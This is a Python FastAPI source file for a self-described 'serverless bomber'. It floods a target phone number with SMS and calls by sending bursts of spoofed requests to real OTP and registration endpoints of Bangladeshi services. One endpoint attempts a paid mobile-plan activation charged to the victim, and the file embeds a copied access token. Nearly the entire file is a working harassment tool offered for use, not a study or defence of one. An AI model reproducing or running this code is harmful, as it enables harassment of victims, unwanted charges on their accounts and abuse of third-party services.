from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional, Dict, Any
import httpx
import asyncio
import random
import string
import base64
from datetime import datetime

app = FastAPI()

# CORS for frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# API Configuration
APIS = {
    "renix_care": {
        "url": "https://renixapi.renixcare.com/sms-api/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://renixcare.com",
            "referer": "https://renixcare.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        },
        "payload_key": "phone"
    },
    "jayabaji": {
        "url": "https://www.jayabaji3.com/api/register/check-username",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "content-type": "application/json",
            "device": "desktop",
            "domain": "www.jayabaji3.com",
            "lang": "bn-bd",
            "origin": "https://www.jayabaji3.com",
            "referer": "https://www.jayabaji3.com/bn-bd?signup=1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
    },
    "pkluck2_register": {
        "url": "https://www.pkluck2.com/wps/verification/sms/register",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Device": "web",
            "Language": "BN",
            "Merchant": "pklubdtf4",
            "Origin": "https://www.pkluck2.com",
            "Referer": "https://www.pkluck2.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
    },
    "pkluck2_nologin": {
        "url": "https://www.pkluck2.com/wps/verification/sms/noLogin",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Device": "web",
            "Language": "BN",
            "Merchant": "pklubdtf4",
            "Origin": "https://www.pkluck2.com",
            "Referer": "https://www.pkluck2.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
    },
    "gp_flexiplan": {
        "url": "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Authorization": "Bearer null",
            "Content-Type": "application/json",
            "Origin": "https://www.grameenphone.com",
            "Referer": "https://www.grameenphone.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
    },
    "gp_fwa": {
        "url": "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://gpfi.grameenphone.com",
            "Referer": "https://gpfi.grameenphone.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
    },
    "mevrik": {
        "url": "https://channels.mevrik.com:4202/api/v1/claim-session",
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "text/plain",
            "Origin": "https://chat.mevrik.com:4213",
            "Referer": "https://chat.mevrik.com:4213/",
            "x-mevrik-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsImNoYW5uZWwiOiJncC13ZWJzaXRlIiwibXNpc2RuIjoiOTcxOEE3NTctNjUwOC00NUM0LThEQ0EtQTgxRDhGQUYyMkI2IiwiZGV2aWNlX2lkIjoiZ2VuZXJpYyIsImlhdCI6MTc1OTg2NTMwMSwiaXNzIjoibWV2cmlrLmNvbSIsImV4cCI6MTc1OTg2NzEwMSwiaHR0cHM6XC9cL21ldnJpay5jb21cL2p3dFwvY2xhaW1zIjp7IngtbWV2cmlrLWFsbG93ZWQtcm9sZXMiOlsidXNlciJdfX0.O6gms45yShqhy3tj7Z97vCrgXY5h1EWcPbIGpaJBlmE",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
    },
    "priyoshikkhaloy": {
        "url": "https://app.priyoshikkhaloy.com/api/user/register-login.php",
        "method": "POST",
        "headers": {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/x-www-form-urlencoded",
        }
    }
}

def generate_payload(api_name: str, phone: str) -> Dict:
    """Generate payload for specific API"""
    if api_name == "renix_care":
        return {"phone": phone}
    elif api_name == "jayabaji":
        username = f"user{''.join(random.choices(string.digits, k=6))}"
        return {"username": username, "email": "", "mobileno": phone, "language": "bn", "langCountry": "bn-bd"}
    elif api_name == "pkluck2_register":
        return {"countryDialingCode": "880", "mobileNo": phone}
    elif api_name == "pkluck2_nologin":
        return {"mobileNum": phone, "countryDialingCode": "880"}
    elif api_name == "gp_flexiplan":
        return {
            "payment_mode": "mobile_balance",
            "longevity": 1,
            "voice": 100,
            "data": 0,
            "fourg": 0,
            "bioscope": 0,
            "sms": 0,
            "mca": 0,
            "price": 69,
            "msisdn": phone,
            "bundle_id": 60817,
            "is_login": False
        }
    elif api_name == "gp_fwa":
        return {"phone": phone, "email": "", "language": "en"}
    elif api_name == "mevrik":
        names = ["MD Hossain", "Ali Khan", "Rahim Ahmed", "Rakib Hasan", "Shahidul Islam"]
        return {"data": {"user_ref": phone, "name": random.choice(names)}}
    elif api_name == "priyoshikkhaloy":
        return {"mobile": phone}
    return {"phone": phone}

async def send_single_request(api_name: str, api_config: Dict, phone: str) -> Dict:
    """Send single API request"""
    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            payload = generate_payload(api_name, phone)
            headers = api_config["headers"].copy()
            
            if api_name == "priyoshikkhaloy":
                response = await client.post(api_config["url"], headers=headers, data=payload)
            else:
                response = await client.post(api_config["url"], headers=headers, json=payload)
            
            return {
                "api": api_name,
                "success": response.status_code == 200,
                "status": response.status_code,
                "phone": phone
            }
    except Exception as e:
        return {
            "api": api_name,
            "success": False,
            "error": str(e)[:100],
            "phone": phone
        }

class BombRequest(BaseModel):
    phone: str
    mode: str = "both"  # sms, call, both
    requests_per_api: int = 5
    apis_to_use: Optional[list] = None

@app.get("/")
async def root():
    return {
        "status": "💀 FuhX OMEGA ACTIVE 💀",
        "owner": "@FuhX",
        "message": "Serverless bomber is ready",
        "apis_loaded": len(APIS),
        "version": "OMEGA-V4.7.2"
    }

@app.get("/api/health")
async def health():
    return {
        "status": "online",
        "owner": "@FuhX",
        "timestamp": datetime.now().isoformat(),
        "apis": list(APIS.keys())
    }

@app.post("/api/bomb")
async def bomb_target(request: BombRequest):
    """
    Main bombing endpoint
    """
    phone = request.phone
    mode = request.mode
    req_per_api = min(request.requests_per_api, 20)  # Max 20 per API to avoid timeout
    
    # Select APIs based on mode
    if request.apis_to_use:
        api_list = [(name, APIS[name]) for name in request.apis_to_use if name in APIS]
    else:
        api_list = list(APIS.items())
    
    # For "call" mode, filter only call-capable APIs (you can customize this)
    if mode == "call":
        # Call-specific APIs (modify as needed)
        call_apis = ["renix_care", "gp_fwa"]
        api_list = [(name, APIS[name]) for name in call_apis if name in APIS]
    elif mode == "sms":
        # All APIs are SMS by default
        pass
    
    total_requests = len(api_list) * req_per_api
    results = []
    
    # Send requests with concurrency control (max 10 concurrent)
    semaphore = asyncio.Semaphore(10)
    
    async def bounded_send(api_name, api_config, phone, count):
        async with semaphore:
            tasks = []
            for i in range(count):
                tasks.append(send_single_request(api_name, api_config, phone))
            return await asyncio.gather(*tasks)
    
    # Process each API
    for api_name, api_config in api_list:
        api_results = await bounded_send(api_name, api_config, phone, req_per_api)
        results.extend(api_results)
    
    # Calculate stats
    success_count = sum(1 for r in results if r.get("success"))
    fail_count = len(results) - success_count
    
    return {
        "success": True,
        "target": phone,
        "mode": mode,
        "total_requests": len(results),
        "success_count": success_count,
        "fail_count": fail_count,
        "results": results[:50],  # Return first 50 results
        "message": f"💀 Bombing completed! {success_count}/{len(results)} successful"
    }

@app.post("/api/bomb-fast")
async def bomb_fast(request: BombRequest):
    """
    Fast bombing - higher concurrency, but may hit rate limits
    """
    phone = request.phone
    req_per_api = min(request.requests_per_api, 10)
    
    # Use first 5 APIs only for speed
    api_list = list(APIS.items())[:8]
    
    # Create all tasks
    all_tasks = []
    for api_name, api_config in api_list:
        for i in range(req_per_api):
            all_tasks.append(send_single_request(api_name, api_config, phone))
    
    # Fire all at once
    results = await asyncio.gather(*all_tasks)
    
    success_count = sum(1 for r in results if r.get("success"))
    
    return {
        "success": True,
        "target": phone,
        "total_requests": len(results),
        "success_count": success_count,
        "fail_count": len(results) - success_count,
        "results": results[:30]
}
